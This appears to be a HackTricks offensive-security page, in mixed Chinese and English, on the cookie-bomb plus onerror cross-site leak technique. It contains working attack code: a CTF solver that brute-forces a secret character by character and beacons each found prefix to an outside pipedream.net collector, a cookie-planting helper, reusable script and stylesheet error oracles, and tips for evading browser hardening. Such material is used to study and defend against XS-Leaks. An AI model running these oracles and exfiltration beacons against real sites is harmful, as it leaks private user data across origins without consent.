# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: 填充受害者浏览器中目标 origin 的大量/大型 cookie，使后续请求触及服务器/请求限制（请求头大小、重定向中的 URL 大小等）。
- Error-event oracle: 使用 `<script>`（或其他子资源）探测跨域端点，并通过 `onload` 与 `onerror` 区分不同状态。

High level idea
- 找到一个目标端点，其在你要检测的两种状态下行为不同（例如，搜索 “hit” vs “miss”）。
- 确保 “hit” 路径会触发大量重定向链或很长的 URL，而 “miss” 路径保持短小。通过大量 cookie 扩大请求头，使得只有 “hit” 路径会让服务器因请求过大而失败并返回 HTTP 错误（例如 431/414/400）。该错误会触发 onerror 事件，从而成为 XS-Search 的探测 oracle。

When does this work
- 你能使受害者浏览器向目标发送 cookie（例如，cookie 为 SameSite=None，或你可以通过 popup `window.open` 在 first-party 上下文中设置它们）。
- 应用有可滥用的功能来设置任意 cookie（例如，把受控输入名/值变成 Set-Cookie 的 “save preference” 端点），或可在已认证后进行重定向并把攻击者控制的数据嵌入 URL。
- 服务器在两种状态下有不同反应，并且在扩大请求头/URL 后，其中一种状态越过限制并返回触发 onerror 的错误响应。

Note on server errors used as the oracle
- 431 Request Header Fields Too Large 通常在 cookie 导致请求头膨胀时返回；长请求目标可能返回 414 URI Too Long 或特定服务器的 400。任何这些都会导致子资源加载失败并触发 onerror。参见 [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) 了解因过多 cookie 等典型原因。

<details>
<summary>Practical example (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

为什么使用 popup (`window.open`)？
- 现代浏览器越来越多地阻止 third-party cookies。向目标打开一个 top-level 窗口可以使 cookies 成为 first‑party，因此目标发出的 Set-Cookie 响应会生效，从而即使在 third‑party cookie 限制下也能触发 cookie-bomb 步骤。

2024–2025 关于 cookie 可用性的说明
- Chrome’s Tracking Protection rollout (January 2024) 已经在对一部分随机用户阻止 third-party cookies，并计划在 UK CMA 批准后扩展到全部用户，因此假设任何受害者随时可能失去 3P cookies。自动化回退：检测当你的脚本探测在未真实访问目标的情况下失败，并透明地切换到 popup/first-party 流程。Safari 和 Firefox 默认已阻止大多数 third-party cookies，且 CHIPS/partitioned cookies 意味着每个 top-level 站点现在都有自己的罐子。
- 使用 first‑party cookie planting 流程（`window.open` + 自动提交到 cookie-setting endpoint），然后用一个 subresource 进行探测，该 subresource 仅在这些 cookies 被发送时成功。如果 third‑party cookies 被阻止，将探测移到 same-site 上下文（例如，在 popup 中通过 same-site gadget 运行 oracle，并用 `postMessage` 或一个 beacon 向你的服务器 exfiltrate 那个布尔值），或者如果你合法控制该 origin，则将受害者 origin 注册到 Chrome’s deprecation trial。

<details>
<summary>适用于 Tracking-Protection 的 first-party planting helper</summary>

当你需要从 cross-site 上下文植入数十个 cookies 时，先开一个临时 top-level 窗口，并向易受攻击的 Set-Cookie endpoint 发出一系列超大表单提交：
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
在开始探测之前调用它，这样每次 oracle 运行都会以新填充的 cookie jar 开始。

</details>

通用探测助手
如果你已经有办法在目标源（first-party）上设置大量 cookies，你可以将这个最小化的 oracle 重用于任何其成功/失败会导致不同网络结果（status/MIME/redirect）的 endpoint：
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternative tag oracle (样式表)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
高级: de Bruijn–based cookie packing (CTF-proven)
- 当应用允许你控制较大的 cookie 值时，你可以通过在每个 probe 后附加 de Bruijn sequence 来高效地打包猜测。这使得每次 probe 的开销保持较小，同时确保只有在正确的前缀时，heavy branch 才持续更重。用于长度为 n、由 |Σ| 个符号组成的示例生成器（fits in a cookie value）：
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
